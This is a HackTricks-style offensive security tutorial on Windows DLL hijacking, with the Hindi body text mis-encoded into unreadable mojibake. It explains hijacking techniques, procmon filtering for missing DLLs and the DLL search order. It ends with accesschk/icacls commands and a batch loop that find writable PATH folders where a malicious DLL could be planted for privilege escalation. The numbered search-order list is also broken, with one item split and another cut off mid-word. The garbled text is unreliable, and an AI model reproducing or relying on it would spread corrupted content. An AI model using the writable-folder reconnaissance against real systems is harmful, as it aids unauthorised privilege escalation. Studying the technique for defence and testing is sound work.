# Dll Hijacking

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* рдкрд░ рдлреЙрд▓реЛ\*\* рдХрд░реЗрдВред
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ **PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **Intigriti** рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ**! рдЖрдЬ рд╣реА рд╣рдорд╛рд░реЗ рд╕рд╛рде рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдФрд░ рд╢реБрд░реВ рдХрд░реЗрдВ рдмрд╛рдЙрдВрдЯреА рдЕрдк рдЯреВ **$100,000** рддрдХ рдХрдорд╛рдирд╛!

{% embed url="https://go.intigriti.com/hacktricks" %}

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдореЗрдВ рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА DLL рд▓реЛрдб рдХрд░рдиреЗ рдореЗрдВ рдмрджрд▓рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдпрд╣ рд╢рдмреНрдж рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ рдЬреИрд╕реЗ **DLL Spoofing, Injection, рдФрд░ Side-Loading**ред рдпрд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди, рд╕реНрдерд┐рд░рддрд╛ рдкреНрд░рд╛рдкреНрддрд┐ рдФрд░, рдХрдо рдЖрдорддреМрд░ рдкрд░, рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣рд╛рдБ рдЙрдиреНрдирдпрди рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХрд╛ рддрд░реАрдХрд╛ рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд╕рд╛рде рд╕рдВрдЧрдд рд░рд╣рддрд╛ рд╣реИред

### рд╕рд╛рдорд╛рдиреНрдп рддрдХрдиреАрдХреЗрдВ

рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкреНрд░рддреНрдпреЗрдХ рдХреА рдкреНрд░рднрд╛рд╡рдХрд╛рд░рд┐рддрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА DLL рд▓реЛрдбрд┐рдВрдЧ рд░рдгрдиреАрддрд┐ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреА рд╣реИ:

1. **DLL рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрди**: рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп DLL рдХреЛ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА рд╕реЗ рдмрджрд▓рдирд╛, рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ DLL рдкреНрд░реЙрдХреНрд╕реАрдЗрдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдореВрд▓ DLL рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдПред
2. **DLL рдЦреЛрдЬ рдХреНрд░рдо рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ**: рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп DLL рдХреЗ рд╕рд╛рдордиреЗ рдПрдХ рдЦреЛрдЬ рдкрде рдореЗрдВ рджреБрд░реБрдкрдпреЛрдЧреА DLL рд░рдЦрдирд╛, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдЦреЛрдЬ рдкреИрдЯрд░реНрди рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ред
3. **рдлреИрдВрдЯрдо DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ**: рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА DLL рдмрдирд╛рдирд╛ рдЬрд┐рд╕реЗ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд▓реЛрдб рдХрд░реЗрдЧрд╛, рд╕реЛрдЪрддреЗ рд╣реБрдП рдХрд┐ рдпрд╣ рдПрдХ рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди рдЖрд╡рд╢реНрдпрдХ DLL рд╣реИред
4. **DLL рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди**: рдЦреЛрдЬ рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдЬреИрд╕реЗ `%PATH%` рдпрд╛ `.exe.manifest` / `.exe.local` рдлрд╝рд╛рдЗрд▓реЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рджреБрд░реБрдкрдпреЛрдЧреА DLL рдкрд░ рдорд╛рд░реНрдЧрджрд░реНрд╢рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
5. **WinSxS DLL рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрди**: рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп DLL рдХреЛ WinSxS рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдПрдХ рджреБрд░реБрдкрдпреЛрдЧреА рд╕рдВрдмрдВрдзрд┐рдд рд╡рд╕реНрддреБ рд╕реЗ рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛, рдПрдХ рддрдХрдиреАрдХ рдЬрд┐рд╕реЗ рдЕрдХреНрд╕рд░ DLL рд╕рд╛рдЗрдб-рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред
6. **рд╕рд╛рдкреЗрдХреНрд╖ рдорд╛рд░реНрдЧ DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ**: рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рджреБрд░реБрдкрдпреЛрдЧреА DLL рд░рдЦрдирд╛, рдирдХрд▓реА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝реЗ рдЧрдП рдмрд╛рдЗрдирд░реА рдкреНрд░реЙрдХреНрд╕реА рдирд┐рд╖реНрдкрд╛рджрди рддрдХрдиреАрдХреЛрдВ рдХреА рддрд░рд╣ред

## рдЧрд╛рдпрдм Dlls рдЦреЛрдЬрдирд╛

рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдЧрд╛рдпрдм Dlls рдЦреЛрдЬрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рд╕рд╛рдорд╛рдиреНрдп рддрд░реАрдХрд╛ [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) рдХреЛ рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдЪрд▓рд╛рдирд╛ рд╣реИ, **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд 2 рдлрд╝рд┐рд▓реНрдЯрд░ рд╕реЗрдЯ рдХрд░реЗрдВ**:

![](<../../../.gitbook/assets/image (311).png>)

![](<../../../.gitbook/assets/image (313).png>)

рдФрд░ рдмрд╕ **рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдЧрддрд┐рд╡рд┐рдзрд┐** рджрд┐рдЦрд╛рдПрдВ:

![](<../../../.gitbook/assets/image (314).png>)

рдпрджрд┐ рдЖрдк **рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЧрд╛рдпрдм dlls рдЦреЛрдЬ рд░рд╣реЗ рд╣реИрдВ** рддреЛ рдЖрдкрдХреЛ рдХреБрдЫ **рд╕реЗрдХрдВрдб рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рдЪрд▓рдиреЗ рджреЗрдВ**ред\
рдпрджрд┐ рдЖрдк **рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдХреЗ рднреАрддрд░ рдЧрд╛рдпрдм dll рдЦреЛрдЬ рд░рд╣реЗ рд╣реИрдВ** рддреЛ рдЖрдкрдХреЛ **"рдкреНрд░реЛрд╕реЗрд╕ рдирд╛рдо" "рд╢рд╛рдорд┐рд▓ рд╣реИ" "<рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдирд╛рдо>" рдЬреИрд╕рд╛ рдПрдХ рдФрд░ рдлрд╝рд┐рд▓реНрдЯрд░ рд╕реЗрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕реЗ рдЪрд▓рд╛рдПрдВ рдФрд░ рдШрдЯрдирд╛рдУрдВ рдХреЛ рд░реЛрдХреЗрдВ**ред

## рдЧрд╛рдпрдм Dlls рдХрд╛ рд╢реЛрд╖рдг

рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рдореМрдХрд╛ рд╣реИ рдХрд┐ рд╣рдо **рдПрдХ dll рд▓рд┐рдЦ рд╕рдХреЗрдВ рдЬрд┐рд╕реЗ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧреА** рдХрд┐рд╕реА **рдРрд╕реЗ рд╕реНрдерд╛рди рдкрд░ рдЬрд╣рд╛рдВ рдЗрд╕реЗ рдЦреЛрдЬрд╛ рдЬрд╛рдПрдЧрд╛**ред рдЗрд╕рд▓рд┐рдП, рд╣рдореЗрдВ **рдПрдХ** рдРрд╕реЗ **рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдПрдХ dll рд▓рд┐рдЦрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрдЧреА рдЬрд╣рд╛рдВ** рдпрд╣ **рдореВрд▓ dll рд╕реЗ рдкрд╣рд▓реЗ рдЦреЛрдЬреА рдЬрд╛рдПрдЧреА** (рдЕрдЬреАрдм рдорд╛рдорд▓рд╛), рдпрд╛ рд╣рдореЗрдВ **рдХрд┐рд╕реА рдлрд╝реЛрд▓реНрдбрд░ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрдЧреА рдЬрд╣рд╛рдВ dll рдЦреЛрдЬреА рдЬрд╛рдПрдЧреА** рдФрд░ рдореВрд▓ **dll рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ**ред

### Dll рдЦреЛрдЬ рдХреНрд░рдо

[**Microsoft рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **рдореЗрдВ рдЖрдк рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдХреИрд╕реЗ Dlls рд▓реЛрдб рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЗрд╕реЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред**

**Windows рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХреНрд░рдо рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ DLLs рдХреА рдЦреЛрдЬ рдХрд░рддреЗ рд╣реИрдВ, рдПрдХ рд╡рд┐рд╢реЗрд╖ рдХреНрд░рдо рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдПред DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреА рд╕рдорд╕реНрдпрд╛ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм рдПрдХ рд╣рд╛рдирд┐рдХрд╛рд░рдХ DLL рдЗрди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рд╕реЗ рдПрдХ рдореЗрдВ рд░рдгрдиреАрддрд┐рдХ рд░реВрдк рд╕реЗ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдореВрд▓ DLL рд╕реЗ рдкрд╣рд▓реЗ рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИред рдЗрд╕реЗ рд░реЛрдХрдиреЗ рдХрд╛ рдПрдХ рд╕рдорд╛рдзрд╛рди рдпрд╣ рд╣реИ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рд╡рд╣ рдЙрд╕ DLL рдХреЛ рдЬрд┐рд╕рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддреЗ рд╕рдордп рдкреВрд░реНрдг рдорд╛рд░реНрдЧреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

рдЖрдк 32-рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдкрд░ **DLL рдЦреЛрдЬ рдХреНрд░рдо** рдиреАрдЪреЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

1. рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬрд┐рд╕рд╕реЗ рд▓реЛрдб рд╣реБрдЖ рд╣реИ рдЙрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред
2. рд╕рд┐рд╕реНрдЯрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред(_C:\Windows\System32_)
3. 16-рдмрд┐рдЯ рд╕рд┐рд╕реНрдЯрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рдлрд╝рдВрдХреНрд╢рди рдирд╣реАрдВ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдЦреЛрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред (_C:\Windows\System_)
4. Windows рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрде рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
5. (_C:\Windows_)
6. рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ред
7. PATH рдкрд░реНрдпрд╛рд╡рд░рдг рдЪ

#### Windows рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ DLL рдЦреЛрдЬ рдХреНрд░рдо рдкрд░ рдЕрдкрд╡рд╛рдж

Windows рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рдЕрдкрд╡рд╛рдж рд╕реНрдерд╛рдиреАрдп DLL рдЦреЛрдЬ рдХреНрд░рдо рдХреЗ рд▓рд┐рдП рдиреЛрдЯ рдХрд┐рдП рдЧрдП рд╣реИрдВ:

* **рдЬрдм рдХрд┐рд╕реА DLL рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд▓реЛрдб рдХрд┐рдП рдЧрдП DLL рдХреЗ рдирд╛рдо рдХреЗ рд╕рд╛рде рдорд┐рд▓рддрд╛ рд╣реИ**, рддреЛ рд╕рд┐рд╕реНрдЯрдо рд╕рд╛рдорд╛рдиреНрдп рдЦреЛрдЬ рдХреЛ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрдЬрд╛рдп, рдпрд╣ рд░реАрдбрд╛рдпрд░реЗрдХреНрд╢рди рдФрд░ рдПрдХ рдореИрдирд┐рдлреЗрд╕реНрдЯ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рдкрд╣рд▓реЗ рд╕реЗ рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рдХрд┐рдП рдЧрдП DLL рдХреА рдУрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реЛрддрд╛ рд╣реИред **рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рд╕рд┐рд╕реНрдЯрдо DLL рдХреЗ рд▓рд┐рдП рдЦреЛрдЬ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ**ред
* рдЬрдм DLL рдХреЛ **рд╡рд░реНрддрдорд╛рди Windows рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЬрд╛рдирд╛ рдЧрдпрд╛ DLL** рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕рд┐рд╕реНрдЯрдо рдЗрд╕рдХреЗ рдЬрд╛рдиреЗ рдЧрдП DLL рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛, рд╕рд╛рде рд╣реА рдЗрд╕рдХреЗ рдирд┐рд░реНрднрд░ DLL рдХрд╛, **рдЦреЛрдЬ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ**ред рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** рдЗрди рдЬрд╛рдиреЗ рдЧрдП DLLs рдХреА рд╕реВрдЪреА рдХреЛ рдзрд╛рд░рд┐рдд рдХрд░рддреА рд╣реИред
* рдЕрдЧрд░ рдХрд┐рд╕реА **DLL рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**, рддреЛ рдЗрди рдЖрд╡рд╢реНрдпрдХ DLLs рдХреА рдЦреЛрдЬ рдЙрдирдХреЗ **рдореЙрдбреНрдпреВрд▓ рдирд╛рдореЛрдВ** рджреНрд╡рд╛рд░рд╛ рд╣реЛрддреА рд╣реИ, рдЪрд╛рд╣реЗ рдкрд╣рд▓реА DLL рдкреВрд░реА рдкрде рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣рдЪрд╛рдиреА рдЧрдИ рд╣реЛ рдпрд╛ рди рд╣реЛред

### рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдиреНрдирддрд┐

**рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ**:

* **рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреЛрдВ рдХреЗ рддрд╣рдд рдХрд╛рдо рдХрд░рдиреЗ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ** (рдХреНрд╖реИрддрд┐рдЬ рдпрд╛ рд▓реИрдЯрд░рд▓ рдЪрд▓рди), рдЬрд┐рд╕рдореЗрдВ **рдХрд┐рд╕реА DLL рдХреА рдХрдореА** рд╣реИред
* рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ **рд▓рд┐рдЦрдиреЗ рдХреА рдкрд╣реБрдВрдЪ** рдЙрдкрд▓рдмреНрдз рд╣реИ рдХрд┐рд╕реА **рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛** рдореЗрдВ рдЬрд┐рд╕рдореЗрдВ **DLL** рдХреА **рдЦреЛрдЬ рдХреА рдЬрд╛рдПрдЧреА**ред рдпрд╣ рд╕реНрдерд╛рди рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдпрд╛ рд╕рд┐рд╕реНрдЯрдо рдкрде рдХреЗ рднреАрддрд░ рдХреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред

рд╣рд╛рдВ, рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рдЦреЛрдЬрдирд╛ рдХрдард┐рди рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдХрд╛рд░реНрдпрдХреНрд░рдо рдЬреЛ рдПрдХ DLL рдХреА рдХрдореА рд╣реИ рдвреВрдВрдврдирд╛ рдЕрдЬреАрдм рд╣реИ** рдФрд░ рдпрд╣ рднреА **рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдкрде рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдирд╛ рдФрд░ рднреА рдЕрдЬреАрдм рд╣реИ** (рдЖрдк рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ)ред рд▓реЗрдХрд┐рди, рдЧрд▓рдд рд░реВрдк рд╕реЗ рд╡рд┐рдиреНрдпрд╕реНрдд рдкрд░рд┐рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдпрд╣ рд╕рдВрднрд╡ рд╣реИред\
рдЙрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдпрджрд┐ рдЖрдк рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реИрдВ рдФрд░ рдЖрдк рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк [UACME](https://github.com/hfiref0x/UACME) рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХрд╛ **рдореБрдЦреНрдп рд▓рдХреНрд╖реНрдп UAC рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдирд╛** рд╣реИ, рд▓реЗрдХрд┐рди рдЖрдк рд╡рд╣рд╛рдБ рдПрдХ Windows рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ Dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХрд╛ **PoC** рднреА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ (рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХреЗрд╡рд▓ рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдкрде рдХреЛ рдмрджрд▓рдХрд░ рдЬрд╣рд╛рдБ рдЖрдкрдХреЗ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ)ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк **рдХрд┐рд╕реА рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдкрдиреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдХрд░рдХреЗ:

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

рдФрд░ **рдкрде рдХреЗ рд╕рднреА рдлреЛрд▓реНрдбрд░реЛрдВ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

